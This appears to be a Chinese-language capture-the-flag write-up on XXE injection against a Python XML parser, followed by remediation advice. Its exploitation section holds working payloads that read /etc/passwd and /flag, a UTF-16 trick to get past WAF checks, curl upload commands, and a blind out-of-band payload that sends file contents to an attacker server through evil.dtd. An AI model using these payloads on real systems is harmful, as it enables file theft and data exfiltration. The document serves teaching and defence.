# A02 Security Misconfiguration - Hard 解题思路

## 漏洞分析

本题考察的是 **XML External Entity (XXE) Injection** —— XML外部实体注入漏洞。

### 漏洞成因

系统使用 Python 的 `xml.etree.ElementTree` 解析用户提供的XML数据：

```python
import xml.etree.ElementTree as ET
# ...
tree = ET.parse(io.StringIO(xml_text))
```

`xml.etree.ElementTree` 在 Python 3.x 中默认解析外部实体（取决于具体版本和libexpat配置），当XML解析器未正确配置以禁用外部实体解析时，攻击者可以通过DTD（文档类型定义）声明外部实体，从而读取服务器上的任意文件、执行SSRF攻击或导致拒绝服务（Billion Laughs攻击）。

### 安全配置错误

正确的XML解析应该禁用外部实体和DTD：

```python
import xml.etree.ElementTree as ET
import defusedxml.ElementTree as DET  # 使用defusedxml更安全

# 或使用原生库时禁用外部实体
parser = ET.XMLParser()
parser.entity_declaration = False  # 并非所有版本都支持
```

本题中完全没有这些安全配置，属于典型的 Security Misconfiguration。

## 利用步骤

### 步骤1：验证XXE漏洞存在

提交基础XXE payload测试：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

如果返回结果中包含 `/etc/passwd` 的内容，说明XXE漏洞存在。

### 步骤2：读取Flag文件

构造payload读取 `/flag`：

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>
    <secret>&xxe;</secret>
</root>
```

### 步骤3：UTF-16编码绕过（进阶）

某些WAF或过滤器可能只检查UTF-8编码的XML。将payload编码为UTF-16可以绕过基于签名的检测。

创建UTF-16编码的文件：

```python
payload = '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>
    <secret>&xxe;</secret>
</root>'''

with open('xxe_utf16.xml', 'wb') as f:
    f.write(payload.encode('utf-16'))
```

然后上传该文件。系统会检测BOM头（`\xff\xfe` 或 `\xfe\xff`）并正确解码。

使用命令行创建：

```bash
cat > xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>
    <secret>&xxe;</secret>
</root>
EOF

iconv -f UTF-8 -t UTF-16 xxe.xml > xxe_utf16.xml
```

然后使用curl上传：

```bash
curl -X POST http://<target>/parse \
  -F "xmlfile=@xxe_utf16.xml"
```

### 步骤4：使用参数实体（Blind XXE）

如果目标系统不直接返回解析结果，可以使用外带（OOB）技术：

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % dtd SYSTEM "http://你的服务器/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

其中 `evil.dtd` 在你的服务器上：

```dtd
<!ENTITY send SYSTEM "http://你的服务器/?flag=%file;">
```

### 步骤5：curl完整利用命令

```bash
# 基础XXE读取flag
curl -X POST http://<target>/parse \
  -d 'xmltext=<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///flag">]><root><secret>&xxe;</secret></root>'

# 读取/etc/passwd验证
curl -X POST http://<target>/parse \
  -d 'xmltext=<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><secret>&xxe;</secret></root>'
```

## 修复建议

### 1. 使用安全的XML解析库

```python
# 推荐使用 defusedxml
import defusedxml.ElementTree as ET

tree = ET.parse(io.StringIO(xml_text))
```

`defusedxml` 是专门用于防御XML攻击的安全包装库。

### 2. 禁用外部实体和DTD（原生库）

```python
import xml.etree.ElementTree as ET

parser = ET.XMLParser()
# 注意：原生xml.etree.ElementTree在某些Python版本中无法完全禁用XXE
# 最安全的方式是使用 lxml 并正确配置
```

### 3. 使用 lxml 并禁用不安全功能

```python
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,  # 禁用外部实体解析
    no_network=True,         # 禁止网络访问
    load_dtd=False,          # 不加载DTD
    dtd_validation=False     # 不进行DTD验证
)

tree = etree.parse(io.StringIO(xml_text), parser)
```

### 4. 使用 JSON 替代 XML

如果业务场景允许，使用JSON格式传输数据可以从根本上避免XXE风险。

### 5. 输入验证与白名单

- 仅允许预期的XML结构和标签
- 拒绝包含 `<!DOCTYPE`、`<!ENTITY` 的输入
- 使用WAF或API网关过滤恶意XML特征

### 6. 最小权限原则

- XML解析服务应以最低权限用户运行
- 限制文件系统访问范围（如使用chroot）
- 禁止解析服务访问网络（防止SSRF）

### 7. 安全配置清单

对于所有XML解析器，应确保：
- [ ] 禁用外部实体解析（XXE）
- [ ] 禁用DTD处理
- [ ] 禁止网络访问（防止SSRF）
- [ ] 限制解析时间和内存（防止DoS）
- [ ] 使用安全的替代格式（如JSON）
